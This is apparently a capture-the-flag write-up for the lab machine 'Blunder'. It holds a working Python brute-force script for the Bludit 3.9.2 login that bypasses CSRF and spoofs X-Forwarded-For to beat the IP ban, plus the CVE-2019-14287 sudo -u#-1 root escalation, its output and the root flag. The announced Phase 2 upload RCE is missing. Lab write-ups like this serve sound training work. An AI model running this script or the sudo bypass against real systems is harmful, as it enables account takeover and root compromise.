Phase 1

Initial Access — cewl + Bludit Brute Force + Image Upload RCE

Step 1: Generate Custom Wordlist with cewl

Why cewl beats rockyou here Instead of trying millions of random passwords, cewl crawls the target website and extracts words that actually appear on it. People often use words from their own content as passwords. A 200-word custom dictionary can succeed where rockyou's 14 million entries fail — because the password is site-specific, not generic. 
$ cewl -m 6 http://10.129.95.225/ -w dict.txt

Step 2: Brute Force with CSRF + IP Ban Bypass

Bludit has dual protection: CSRF tokens and IP-based lockout after failed attempts. The brute-force script handles both — extracting the CSRF token per request and rotating X-Forwarded-For headers to bypass the IP ban:

#!/usr/bin/env python3
"""Bludit 3.9.2 brute-force — CSRF + X-Forwarded-For bypass"""

import multiprocessing, sys, re, requests
from multiprocessing import Queue

def worker(cred_queue, success_queue):
    while True:
        try:
            password = cred_queue.get(timeout=10)
        except:
            return

        session = requests.Session()
        login_page = session.get(login_url)
        csrf = re.search(
            'input.+?name="tokenCSRF".+?value="(.+?)"',
            login_page.text
        ).group(1)

        print(f'[*] Trying: {password}')
        headers = {
            'X-Forwarded-For': password,   # unique per attempt → no IP ban
            'User-Agent': 'Mozilla/5.0',
            'Referer': login_url
        }
        data = {
            'tokenCSRF': csrf,
            'username': username,
            'password': password,
            'save': ''
        }
        r = session.post(login_url, headers=headers,
                         data=data, allow_redirects=False)

        if 'location' in r.headers:
            if '/admin/dashboard' in r.headers['location']:
                print(f'\nSUCCESS: {username}:{password}\n')
                sys.exit()

if __name__ == '__main__':
    host = sys.argv[1]
    login_url = host + '/admin/login'
    username = sys.argv[2]
    wordlist = sys.argv[3]

    with open(wordlist, encoding='latin1') as f:
        passwords = [w.strip() for w in f]

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    for i in range(10):
        p = multiprocessing.Process(target=worker,
                                    args=(cred_queue, success_queue))
        procs.append(p)
        p.start()

    for pwd in passwords:
        cred_queue.put(pwd)

Phase 3

Privilege Escalation — CVE-2019-14287 sudo Bypass

hugo@blunder:~$ sudo -l
(ALL, !root) /bin/bash

This rule means: hugo can run /bin/bash as any user except root.

CVE-2019-14287 — the -1 trick sudo versions before 1.8.28 have an integer overflow bug. The rule (ALL, !root) blocks UID 0 (root). But -u#-1 passes -1 as the user ID. sudo's permission check sees -1 ≠ 0 and allows it. But when the system actually creates the process, -1 wraps around to 0 (unsigned integer overflow) — which IS root. The check says "allowed," the execution says "root." 
# Direct root → blocked
hugo@blunder:~$ sudo -u#0 /bin/bash
Sorry, user hugo is not allowed to execute '/bin/bash' as root

# -1 bypass → root!
hugo@blunder:~$ sudo -u#-1 /bin/bash

root@blunder:/home/hugo# cat /root/root.txt
44bb94a5b32a84d5cebdeee97d1f6ed9
Appendix

Key Takeaways

cewl generates targeted wordlists from the target itself.

When generic wordlists fail, site-specific words often succeed. RolandDeschain (a Stephen King character) appeared on the blog — a word no generic list would contain.

X-Forwarded-For bypasses IP-based rate limiting.

Many web apps trust client-supplied headers for IP identification. Rotating this header per request defeats lockout mechanisms designed to block brute-force attacks.

Multiple CMS installations = multiple credential databases.

Bludit 3.9.2 and 3.10.0a coexisted on the same server. The version you didn't exploit may contain entirely different user credentials.

CVE-2019-14287: sudo -u#-1 bypasses !root exclusions.

Integer overflow: -1 passes the permission check (not root) but becomes UID 0 (root) at execution time. Affects sudo < 1.8.28.

Always check sudo -l for unusual rules.

(ALL, !root) looks secure but has a known bypass. Cross-reference every sudo rule against CVE databases and GTFOBins.
